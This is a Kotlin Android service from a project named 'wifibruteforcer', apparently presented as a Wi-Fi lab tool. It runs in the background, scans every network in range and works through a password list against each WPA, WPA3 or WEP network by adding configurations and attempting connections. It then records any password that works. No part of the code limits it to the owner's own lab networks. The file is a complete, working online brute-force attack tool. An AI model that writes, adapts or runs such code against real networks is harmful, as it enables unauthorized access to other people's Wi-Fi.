package com.santaklouse.example.wifibruteforcer

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.ScanResult
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withTimeoutOrNull
import java.util.concurrent.atomic.AtomicBoolean

class WifiScanService : Service() {

    companion object {
        private const val NOTIFICATION_CHANNEL = "wifi_lab_channel"
        private const val NOTIFICATION_ID = 1
        private const val SCAN_INTERVAL_MS = 30 * 60 * 1000L
        private const val CONNECTION_TIMEOUT_MS = 18_000L
    }

    private lateinit var wifiManager: WifiManager
    private lateinit var devicePolicyManager: DevicePolicyManager
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val cycleMutex = Mutex()
    private val testedBssids = mutableSetOf<String>()
    private val networkStates = linkedMapOf<String, NetworkItem>()
    private val authenticationFailed = AtomicBoolean(false)

    private val scanReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val fresh = intent?.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false) == true
            sendLog(if (fresh) "Получены свежие результаты сканирования" else "Сканирование ограничено; читаю доступные результаты")
            serviceScope.launch { runTestCycle() }
        }
    }

    private val supplicantReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val error = intent?.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1) ?: -1
            if (error == WifiManager.ERROR_AUTHENTICATING) authenticationFailed.set(true)
        }
    }

    override fun onCreate() {
        super.onCreate()
        wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        ContextCompat.registerReceiver(
            this,
            scanReceiver,
            IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION),
            ContextCompat.RECEIVER_EXPORTED
        )
        ContextCompat.registerReceiver(
            this,
            supplicantReceiver,
            IntentFilter(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION),
            ContextCompat.RECEIVER_EXPORTED
        )

        if (!devicePolicyManager.isProfileOwnerApp(packageName)) {
            sendLog("Ошибка: сервис должен работать внутри профиля, где приложение является Profile Owner")
            sendServiceState(false)
            stopSelf()
            return
        }

        sendServiceState(true)
        sendLog("Лабораторный сервис запущен")
        serviceScope.launch {
            while (currentCoroutineContext().isActive) {
                requestScan()
                delay(5_000)
                runTestCycle()
                delay(SCAN_INTERVAL_MS - 5_000)
            }
        }
    }

    private fun hasScanPermission(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    @Suppress("DEPRECATION")
    private fun requestScan() {
        if (!hasScanPermission()) {
            sendLog("Нет разрешения точной геолокации")
            return
        }
        if (!wifiManager.isWifiEnabled) {
            sendLog("Wi-Fi выключен")
            return
        }
        try {
            val accepted = wifiManager.startScan()
            sendLog(if (accepted) "Запрос сканирования принят" else "Запрос сканирования отклонён системой")
        } catch (_: SecurityException) {
            sendLog("Android запретил запуск Wi-Fi-сканирования")
        }
    }

    private suspend fun runTestCycle() = cycleMutex.withLock {
        val scanResults = readScanResults()
        if (scanResults.isEmpty()) {
            sendLog("Доступных сетей не найдено")
            return@withLock
        }

        scanResults.forEach { result ->
            val ssid = result.SSID
            val bssid = result.BSSID
            if (ssid.isBlank() || bssid.isBlank()) return@forEach
            val existing = networkStates[bssid]
            if (existing == null) {
                networkStates[bssid] = NetworkItem(
                    ssid = ssid,
                    bssid = bssid,
                    status = initialStatus(result.capabilities),
                    signal = result.level,
                    capabilities = result.capabilities
                )
            } else {
                networkStates[bssid] = existing.copy(
                    ssid = ssid,
                    signal = result.level,
                    capabilities = result.capabilities
                )
            }
        }
        publishNetworks()

        for (result in scanResults.sortedByDescending { it.level }) {
            val ssid = result.SSID
            val bssid = result.BSSID
            if (ssid.isBlank() || bssid.isBlank() || bssid in testedBssids) continue
            val security = securityType(result.capabilities)
            if (security == Security.OPEN || security == Security.UNSUPPORTED) {
                testedBssids += bssid
                continue
            }

            networkStates[bssid] = networkStates.getValue(bssid).copy(status = Status.TESTING)
            publishNetworks()
            sendLog("Проверяю $ssid ($bssid)")

            var workingPassword: String? = null
            for ((index, password) in LabPasswords.values.withIndex()) {
                sendLog("$ssid: попытка ${index + 1}/${LabPasswords.values.size}")
                if (tryPassword(result, password, security)) {
                    workingPassword = password
                    break
                }
            }

            testedBssids += bssid
            networkStates[bssid] = networkStates.getValue(bssid).copy(
                status = if (workingPassword != null) Status.SUCCESS else Status.FAILED,
                passwordUsed = workingPassword
            )
            if (workingPassword != null) sendLog("Успех: пароль для $ssid найден")
            else sendLog("$ssid: список исчерпан")
            publishNetworks()
        }
    }

    private enum class Security { OPEN, WPA_PSK, WPA3_SAE, WEP, UNSUPPORTED }

    private fun securityType(capabilities: String): Security = when {
        capabilities.contains("EAP", ignoreCase = true) ||
            capabilities.contains("OWE", ignoreCase = true) -> Security.UNSUPPORTED
        capabilities.contains("PSK", ignoreCase = true) -> Security.WPA_PSK
        capabilities.contains("SAE", ignoreCase = true) -> Security.WPA3_SAE
        capabilities.contains("WEP", ignoreCase = true) -> Security.WEP
        else -> Security.OPEN
    }

    private fun initialStatus(capabilities: String): Status = when (securityType(capabilities)) {
        Security.OPEN -> Status.OPEN
        Security.UNSUPPORTED -> Status.UNSUPPORTED
        else -> Status.SECURED
    }

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    private fun readScanResults(): List<ScanResult> {
        if (!hasScanPermission()) return emptyList()
        return try {
            wifiManager.scanResults.orEmpty().distinctBy { it.BSSID }
        } catch (_: SecurityException) {
            sendLog("Android запретил чтение результатов сканирования")
            emptyList()
        }
    }

    @SuppressLint("MissingPermission")
    @Suppress("DEPRECATION")
    private suspend fun tryPassword(
        result: ScanResult,
        password: String,
        security: Security
    ): Boolean {
        val configuration = buildConfiguration(result, password, security)
        val networkId = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                wifiManager.addNetworkPrivileged(configuration).networkId
            } else {
                wifiManager.addNetwork(configuration)
            }
        } catch (_: SecurityException) {
            sendLog("Нет привилегии на добавление Wi-Fi-конфигурации")
            return false
        }
        if (networkId == -1) return false

        authenticationFailed.set(false)
        val enabled = wifiManager.enableNetwork(networkId, true)
        if (!enabled) {
            wifiManager.removeNetwork(networkId)
            delay(1_000)
            return false
        }
        wifiManager.reconnect()

        val connected = withTimeoutOrNull(CONNECTION_TIMEOUT_MS) {
            while (currentCoroutineContext().isActive) {
                if (authenticationFailed.get()) return@withTimeoutOrNull false
                val info = wifiManager.connectionInfo
                if (info != null &&
                    info.networkId == networkId &&
                    info.supplicantState == SupplicantState.COMPLETED &&
                    info.bssid.equals(result.BSSID, ignoreCase = true)
                ) {
                    return@withTimeoutOrNull true
                }
                delay(500)
            }
            false
        } ?: false

        if (!connected) {
            wifiManager.removeNetwork(networkId)
            delay(1_000)
        }
        return connected
    }

    @Suppress("DEPRECATION")
    private fun buildConfiguration(
        result: ScanResult,
        password: String,
        security: Security
    ) = WifiConfiguration().apply {
        SSID = quote(result.SSID)
        BSSID = result.BSSID
        hiddenSSID = false
        when (security) {
            Security.WPA_PSK -> {
                preSharedKey = quote(password)
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
            }
            Security.WPA3_SAE -> {
                preSharedKey = quote(password)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.SAE)
                }
            }
            Security.WEP -> {
                wepKeys[0] = quote(password)
                wepTxKeyIndex = 0
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
            }
            Security.OPEN, Security.UNSUPPORTED -> Unit
        }
    }

    private fun quote(value: String) = "\"$value\""

    private fun publishNetworks() {
        val sorted = networkStates.values.sortedWith(
            compareBy<NetworkItem> {
                when (it.status) {
                    Status.SUCCESS -> 0
                    Status.TESTING -> 1
                    else -> 2
                }
            }.thenByDescending { it.signal }
        )
        sendBroadcast(
            Intent(MainActivity.ACTION_NETWORKS_UPDATED)
                .setPackage(packageName)
                .putParcelableArrayListExtra(MainActivity.EXTRA_NETWORKS, ArrayList(sorted))
        )
    }

    private fun sendLog(message: String) {
        sendBroadcast(
            Intent(MainActivity.ACTION_LOG_UPDATED)
                .setPackage(packageName)
                .putExtra(MainActivity.EXTRA_LOG, message)
        )
    }

    private fun sendServiceState(running: Boolean) {
        sendBroadcast(
            Intent(MainActivity.ACTION_SERVICE_STATE)
                .setPackage(packageName)
                .putExtra(MainActivity.EXTRA_RUNNING, running)
        )
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(
                    NOTIFICATION_CHANNEL,
                    "Wi-Fi Lab",
                    NotificationManager.IMPORTANCE_LOW
                )
            )
        }
    }

    private fun createNotification() = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL)
        .setContentTitle("Wi-Fi Lab")
        .setContentText("Сканирование и проверка лабораторных сетей")
        .setSmallIcon(android.R.drawable.ic_menu_compass)
        .setContentIntent(
            PendingIntent.getActivity(
                this,
                0,
                Intent(this, MainActivity::class.java),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
        )
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceScope.cancel()
        runCatching { unregisterReceiver(scanReceiver) }
        runCatching { unregisterReceiver(supplicantReceiver) }
        sendLog("Сервис остановлен")
        sendServiceState(false)
        super.onDestroy()
    }
}
